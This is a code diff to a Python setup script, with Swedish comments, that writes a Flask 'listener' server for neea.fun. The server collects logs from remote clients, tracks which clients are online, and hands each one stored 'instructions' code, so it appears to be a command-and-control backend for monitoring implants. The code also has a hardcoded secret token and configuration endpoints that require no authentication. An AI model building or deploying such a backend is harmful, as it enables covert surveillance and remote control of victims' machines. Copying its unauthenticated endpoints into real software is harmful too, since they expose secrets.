@@ -1,4 +1,3 @@
-
 #!/usr/bin/python
 import subprocess
 import sys
@@ -10,18 +9,41 @@ import time
 def setup_environment():
     """Säkerställer att nödvändiga kataloger finns."""
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    base_dir = os.path.dirname(os.path.dirname(script_dir))
+    
+    # Anpassa för Apache-konfiguration - Använd /var/www/neea.fun som basdir
+    base_dir = "/var/www/neea.fun"
+    if not os.path.exists(base_dir):
+        # Om vi inte kör på servern, använd utvecklingsmiljö
+        base_dir = os.path.dirname(os.path.dirname(script_dir))
+        print(f"Kör i utvecklingsmiljö med basdir: {base_dir}")
     
     # Skapa nödvändiga kataloger
     data_dir = os.path.join(base_dir, "data", "logs")
     clients_dir = os.path.join(data_dir, "clients")
+    listener_dir = os.path.join(base_dir, "listener", "neea")
     static_dir = os.path.join(base_dir, "static")
     templates_dir = os.path.join(base_dir, "templates")
     config_dir = os.path.join(base_dir, "config")
     
-    for directory in [data_dir, clients_dir, static_dir, templates_dir, config_dir]:
+    for directory in [data_dir, clients_dir, listener_dir, static_dir, templates_dir, config_dir]:
         os.makedirs(directory, exist_ok=True)
         print(f"Säkerställt att katalogen finns: {directory}")
+    
+    # Skapa WSGI-fil om den inte finns
+    wsgi_file = os.path.join(listener_dir, "neea.wsgi")
+    if not os.path.exists(wsgi_file):
+        with open(wsgi_file, "w") as f:
+            f.write("""#!/usr/bin/python3
+import sys
+import os
+
+# Lägg till applikationsmappen i sökvägarna
+sys.path.insert(0, '/var/www/neea.fun/listener/neea')
+
+# Importera Flask-applikationen
+from server import app as application
+""")
+        print(f"WSGI-fil skapad: {wsgi_file}")
     
     return True
 
@@ -697,6 +719,308 @@ while True:
     print("instructions.py finns redan")
     return True
 
+def setup_server_py():
+    """Säkerställer att server.py finns och konfigureras för Apache."""
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    # Anpassa för Apache-konfiguration
+    base_dir = "/var/www/neea.fun"
+    if not os.path.exists(base_dir):
+        # Om vi inte kör på servern, använd utvecklingsmiljö
+        base_dir = os.path.dirname(os.path.dirname(script_dir))
+    
+    listener_dir = os.path.join(base_dir, "listener", "neea")
+    server_file = os.path.join(listener_dir, "server.py")
+    
+    if not os.path.exists(server_file):
+        os.makedirs(os.path.dirname(server_file), exist_ok=True)
+        with open(server_file, "w", encoding="utf-8") as f:
+            f.write("""#!/usr/bin/python3
+import os
+import json
+import datetime
+import hashlib
+import base64
+import logging
+from flask import Flask, request, jsonify, send_from_directory
+from flask_cors import CORS
+
+# Konfigurera loggning
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('/var/log/neea/app.log'),
+        logging.StreamHandler()
+    ]
+)
+
+# Konfigurera Flask-appen
+app = Flask(__name__)
+CORS(app)  # Aktivera CORS för alla rutter
+
+# Definiera sökvägar
+BASE_DIR = "/var/www/neea.fun"
+DATA_DIR = os.path.join(BASE_DIR, "data")
+CLIENTS_DIR = os.path.join(DATA_DIR, "logs", "clients")
+CONFIG_FILE = os.path.join(BASE_DIR, "config", "server_config.json")
+
+# Skapa nödvändiga kataloger
+os.makedirs(CLIENTS_DIR, exist_ok=True)
+os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
+
+# Standardkonfiguration
+DEFAULT_CONFIG = {
+    "server_url": "https://neea.fun/listener/log_receiver",
+    "secret_token": "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==",
+    "send_interval": 3600,
+    "size_limit": 1048576,
+    "active_threshold": 10,
+    "online_threshold": 15
+}
+
+# Läs eller skapa konfiguration
+def get_config():
+    if not os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, "w") as f:
+            json.dump(DEFAULT_CONFIG, f, indent=4)
+        return DEFAULT_CONFIG
+    
+    try:
+        with open(CONFIG_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return DEFAULT_CONFIG
+
+# Spara konfiguration
+def save_config(config):
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(config, f, indent=4)
+
+# Verifierar authorization header
+def verify_token():
+    auth_header = request.headers.get('Authorization')
+    if not auth_header or not auth_header.startswith('Bearer '):
+        return False
+    
+    token = auth_header.split(' ')[1]
+    config = get_config()
+    return token == config["secret_token"]
+
+# API-rutter
+@app.route('/listener/log_receiver', methods=['POST'])
+def log_receiver():
+    # Verifiera token
+    if not verify_token():
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    try:
+        data = request.json
+        if not data:
+            return jsonify({"error": "No data provided"}), 400
+        
+        # Skapa klientmapp om den inte finns
+        client_id = data.get("user", "unknown") + "_" + data.get("system", "unknown")
+        client_dir = os.path.join(CLIENTS_DIR, client_id)
+        os.makedirs(client_dir, exist_ok=True)
+        
+        # Spara data till fil
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        data_type = data.get("type", "unknown")
+        filename = f"{timestamp}_{data_type}.json"
+        
+        with open(os.path.join(client_dir, filename), "w") as f:
+            json.dump(data, f, indent=4)
+        
+        # Uppdatera klientstatus
+        update_client_status(client_id, data)
+        
+        return jsonify({"status": "success"})
+    
+    except Exception as e:
+        logging.error(f"Error processing request: {e}")
+        return jsonify({"error": str(e)}), 500
+
+# Uppdatera klientstatus
+def update_client_status(client_id, data):
+    status_file = os.path.join(CLIENTS_DIR, "clients_status.json")
+    
+    # Läs befintlig status eller skapa ny
+    if os.path.exists(status_file):
+        try:
+            with open(status_file, "r") as f:
+                clients = json.load(f)
+        except:
+            clients = {}
+    else:
+        clients = {}
+    
+    # Uppdatera eller lägg till klientinfo
+    if client_id not in clients:
+        clients[client_id] = {
+            "id": client_id,
+            "name": data.get("user", "unknown"),
+            "system": data.get("system", "unknown"),
+            "currentInstruction": "standard",
+            "lastActivity": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+    else:
+        clients[client_id]["lastActivity"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Spara uppdaterad status
+    with open(status_file, "w") as f:
+        json.dump(clients, f, indent=4)
+
+# Hämta klientlista
+@app.route('/api/clients', methods=['GET'])
+def get_clients():
+    status_file = os.path.join(CLIENTS_DIR, "clients_status.json")
+    
+    if not os.path.exists(status_file):
+        return jsonify([])
+    
+    try:
+        with open(status_file, "r") as f:
+            clients = json.load(f)
+        
+        # Konvertera till lista
+        client_list = list(clients.values())
+        return jsonify(client_list)
+    except Exception as e:
+        logging.error(f"Error fetching clients: {e}")
+        return jsonify([])
+
+# Uppdatera klientinstruktion
+@app.route('/api/clients/<client_id>/instruction', methods=['PUT'])
+def update_client_instruction(client_id):
+    # Verifiera token
+    if not verify_token():
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    try:
+        data = request.json
+        instruction = data.get("instruction")
+        
+        if not instruction:
+            return jsonify({"error": "No instruction provided"}), 400
+        
+        status_file = os.path.join(CLIENTS_DIR, "clients_status.json")
+        
+        if not os.path.exists(status_file):
+            return jsonify({"error": "No clients found"}), 404
+        
+        with open(status_file, "r") as f:
+            clients = json.load(f)
+        
+        if client_id not in clients:
+            return jsonify({"error": "Client not found"}), 404
+        
+        # Uppdatera instruktion
+        clients[client_id]["currentInstruction"] = instruction
+        
+        with open(status_file, "w") as f:
+            json.dump(clients, f, indent=4)
+        
+        return jsonify({"status": "success"})
+    
+    except Exception as e:
+        logging.error(f"Error updating client instruction: {e}")
+        return jsonify({"error": str(e)}), 500
+
+# Hämta konfiguration
+@app.route('/api/get_config', methods=['GET'])
+def api_get_config():
+    return jsonify(get_config())
+
+# Uppdatera konfiguration
+@app.route('/api/update_config', methods=['POST'])
+def api_update_config():
+    try:
+        data = request.json
+        config = get_config()
+        
+        # Uppdatera fält
+        if "server_url" in data:
+            config["server_url"] = data["server_url"]
+        if "secret_token" in data:
+            config["secret_token"] = data["secret_token"]
+        if "send_interval" in data:
+            config["send_interval"] = int(data["send_interval"])
+        if "size_limit" in data:
+            config["size_limit"] = int(data["size_limit"])
+        if "active_threshold" in data:
+            config["active_threshold"] = int(data["active_threshold"])
+        if "online_threshold" in data:
+            config["online_threshold"] = int(data["online_threshold"])
+        
+        save_config(config)
+        return jsonify({"status": "success"})
+    
+    except Exception as e:
+        logging.error(f"Error updating config: {e}")
+        return jsonify({"error": str(e)}), 500
+
+# Hämta instruktioner för klient
+@app.route('/get_instructions', methods=['GET'])
+def get_instructions():
+    # Verifiera token
+    if not verify_token():
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    client_id = request.args.get('client_id')
+    if not client_id:
+        return jsonify({"error": "No client_id provided"}), 400
+    
+    # Hämta klientstatus
+    status_file = os.path.join(CLIENTS_DIR, "clients_status.json")
+    
+    if os.path.exists(status_file):
+        try:
+            with open(status_file, "r") as f:
+                clients = json.load(f)
+            
+            # Hitta klient och returnera instruktion
+            if client_id in clients:
+                instruction_type = clients[client_id]["currentInstruction"]
+                
+                # Importera instructions.py för att få koden
+                sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+                try:
+                    from instructions import INSTRUCTIONS
+                    if instruction_type in INSTRUCTIONS:
+                        return INSTRUCTIONS[instruction_type]
+                    else:
+                        return INSTRUCTIONS["standard"]
+                except ImportError:
+                    return jsonify({"error": "Instructions module not found"}), 500
+        except Exception as e:
+            logging.error(f"Error fetching instructions: {e}")
+    
+    # Fallback till standardinstruktion
+    return jsonify({"instruction": "standard"})
+
+# Statisk filhantering
+@app.route('/static/<path:path>')
+def send_static(path):
+    return send_from_directory(os.path.join(BASE_DIR, 'static'), path)
+
+# Huvudrutt
+@app.route('/')
+def index():
+    return "Neea Server Running"
+
+if __name__ == "__main__":
+    # Endast för utveckling - i produktion använder vi WSGI/Apache
+    app.run(debug=True, host='0.0.0.0', port=8080)
+""")
+        print(f"Server.py skapad i {server_file}")
+        
+        # Gör server.py körbar
+        os.chmod(server_file, 0o755)
+        return True
+    
+    print("server.py finns redan")
+    return True
+
 def main():
     """
     Startar server.py med korrekt Python-miljö och beroenden.
@@ -716,13 +1040,29 @@ def main():
         print("Kunde inte säkerställa instructions.py")
         return 1
     
-    # Kör server.py med Python
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    server_file = os.path.join(script_dir, "server.py")
+    if not setup_server_py():
+        print("Kunde inte säkerställa server.py")
+        return 1
+    
+    # Kör server.py med Python om vi inte kör på servern
+    server_file = os.path.join("/var/www/neea.fun", "listener", "neea", "server.py")
+    if not os.path.exists(server_file):
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        base_dir = os.path.dirname(os.path.dirname(script_dir))
+        server_file = os.path.join(base_dir, "listener", "neea", "server.py")
+    
+    # Om vi inte har en server.py, använd lokal
+    if not os.path.exists(server_file):
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        server_file = os.path.join(script_dir, "server.py")
     
     try:
-        print("Startar server...")
-        subprocess.run([sys.executable, server_file])
+        print(f"Startar server på {server_file}...")
+        # Kör bara om vi inte är på produktionsservern (Apache hanterar server där)
+        if not os.path.exists("/var/www/neea.fun/listener/neea/neea.wsgi"):
+            subprocess.run([sys.executable, server_file])
+        else:
+            print("Kör på produktionsserver - Apache hanterar server.py via WSGI")
     except Exception as e:
         print(f"Fel vid start av server: {e}")
         return 1
